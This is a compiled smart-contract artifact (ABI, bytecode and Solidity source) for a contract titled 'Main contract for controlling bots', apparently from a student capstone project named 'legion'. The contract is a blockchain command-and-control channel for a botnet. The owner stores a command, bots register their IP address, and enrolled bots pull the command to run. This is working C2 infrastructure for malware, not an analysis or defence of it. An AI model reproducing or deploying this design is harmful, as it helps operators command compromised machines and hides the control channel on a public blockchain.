{
  "contractName": "Controller",
  "abi": [
    {
      "inputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor",
      "signature": "constructor"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "new_command",
          "type": "string"
        }
      ],
      "name": "set_command",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function",
      "signature": "0x174ea651"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "get_command",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function",
      "signature": "0xce7ac4a1"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "ip",
          "type": "string"
        }
      ],
      "name": "join",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function",
      "signature": "0x6a786b07"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "bot_address",
          "type": "address"
        }
      ],
      "name": "is_joined",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function",
      "signature": "0x91445682"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "fund",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function",
      "signature": "0xb60d4288"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506107a8806100606000396000f3fe60806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063174ea651146100725780636a786b071461013a5780639144568214610202578063b60d42881461026b578063ce7ac4a114610275575b600080fd5b34801561007e57600080fd5b506101386004803603602081101561009557600080fd5b81019080803590602001906401000000008111156100b257600080fd5b8201836020820111156100c457600080fd5b803590602001918460018302840111640100000000831117156100e657600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f820116905080830192505050505050509192919290505050610305565b005b34801561014657600080fd5b506102006004803603602081101561015d57600080fd5b810190808035906020019064010000000081111561017a57600080fd5b82018360208201111561018c57600080fd5b803590602001918460018302840111640100000000831117156101ae57600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f8201169050808301925050505050505091929192905050506103e3565b005b34801561020e57600080fd5b506102516004803603602081101561022557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610516565b604051808215151515815260200191505060405180910390f35b61027361056f565b005b34801561028157600080fd5b5061028a610571565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156102ca5780820151818401526020810190506102af565b50505050905090810190601f1680156102f75780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156103c9576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600d8152602001807f4d757374206265206f776e65720000000000000000000000000000000000000081525060200191505060405180910390fd5b80600190805190602001906103df9291906106d7565b5050565b6000600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002090508060020160009054906101000a900460ff161515156104d3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260298152602001807f5468697320616464726573732068617320616c7265616479206265656e20696e81526020017f697469616c697a6564000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b818160010190805190602001906104eb9291906106d7565b5042816000018190555060018160020160006101000a81548160ff0219169083151502179055505050565b6000600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900460ff169050919050565b565b6060600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900460ff161515610637576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260178152602001807f4d7573742062652070617274206f66206e6574776f726b00000000000000000081525060200191505060405180910390fd5b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156106cd5780601f106106a2576101008083540402835291602001916106cd565b820191906000526020600020905b8154815290600101906020018083116106b057829003601f168201915b5050505050905090565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061071857805160ff1916838001178555610746565b82800160010185558215610746579182015b8281111561074557825182559160200191906001019061072a565b5b5090506107539190610757565b5090565b61077991905b8082111561077557600081600090555060010161075d565b5090565b9056fea165627a7a723058201a678a5727a9eb1bfcd8512da9e00bf752da52c39c37e9924fd4feed983776b70029",
  "source": "pragma solidity >=0.4.0 <0.6.0;\n\n/// @title Main contract for controlling bots\n/// @author Doshmajhan\ncontract Controller {\n    address owner;\n    string command;\n    \n    struct Bot {\n        uint last_checkin; // last time the bot reported back\n        string ip_address;     // IP the bot is reporting back from\n        bool initialized;    // if this bot has initialized yet\n    }\n\n    mapping(address => Bot) bots;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    /// @notice Sets the command for the bots to pull down\n    /// @param new_command The new command to be stored\n    function set_command(string memory new_command) public {\n        require(msg.sender == owner, \"Must be owner\");\n        command = new_command;\n    }\n\n    /// @notice Gets the current command stored for the bot to run\n    /// @return The current stored command\n    function get_command() public view returns (string memory) {\n        require(bots[msg.sender].initialized, \"Must be part of network\");\n        return command;\n    }\n\n    /// @notice Joins a bot to our network with the given ip address and eth address\n    ///     each bot is unique to its eth address it was intialized from\n    /// @param ip The ip address of the computer the bot is running on\n    /// @return True if the join was successful\n    function join(string memory ip) public {\n        Bot storage bot = bots[msg.sender];\n        require(!bot.initialized, \"This address has already been initialized\");\n        bot.ip_address = ip;\n        bot.last_checkin = now;\n        bot.initialized = true;\n    }\n\n    /// @notice Checks if the sender address is joined as a bot\n    /// @param bot_address The address to check if it belongs to a bot\n    /// @return True if join, false if not\n    function is_joined(address bot_address) public view returns (bool) {\n        return bots[bot_address].initialized;\n    }\n\n    function fund() public payable { }\n}",
  "sourcePath": "/home/doshmajhan/Capstone/legion/contracts/Controller.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.0+commit.1d4f565a.Emscripten.clang"
  },
  "schemaVersion": "3.0.1",
  "updatedAt": "2019-02-04T02:41:35.433Z",
  "devdoc": {
    "author": "Doshmajhan",
    "methods": {
      "get_command()": {
        "return": "The current stored command"
      },
      "is_joined(address)": {
        "params": {
          "bot_address": "The address to check if it belongs to a bot"
        },
        "return": "True if join, false if not"
      },
      "join(string)": {
        "params": {
          "ip": "The ip address of the computer the bot is running on"
        },
        "return": "True if the join was successful"
      },
      "set_command(string)": {
        "params": {
          "new_command": "The new command to be stored"
        }
      }
    },
    "title": "Main contract for controlling bots"
  },
  "userdoc": {
    "methods": {
      "get_command()": {
        "notice": "Gets the current command stored for the bot to run"
      },
      "is_joined(address)": {
        "notice": "Checks if the sender address is joined as a bot"
      },
      "join(string)": {
        "notice": "Joins a bot to our network with the given ip address and eth address     each bot is unique to its eth address it was intialized from"
      },
      "set_command(string)": {
        "notice": "Sets the command for the bots to pull down"
      }
    }
  }
}